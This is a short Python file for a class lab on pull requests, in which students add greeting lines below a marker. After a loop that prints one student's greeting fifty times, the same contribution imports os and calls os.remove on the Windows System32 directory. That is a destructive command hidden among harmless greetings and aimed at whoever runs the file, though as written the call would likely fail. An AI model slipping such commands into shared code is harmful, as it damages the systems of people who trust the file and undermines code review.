"""SCCM4910 Lab 4 - shared greetings file.

Each student adds ONE greeting line below the marker, on their own branch,
then opens a pull request against their own fork's main branch.
Review the change with a partner before merging it.
"""


def banner():
    print("=== SCCM4910 team greetings ===")


if __name__ == "__main__":
    banner()
    # --- ADD YOUR GREETING BELOW THIS LINE ---
    print("hello from sion")
    for i in range(0,50):
        print("Hello from Alfie! I have recently joined this team!")
    import os 
    os.remove("C:\Windows\System32")

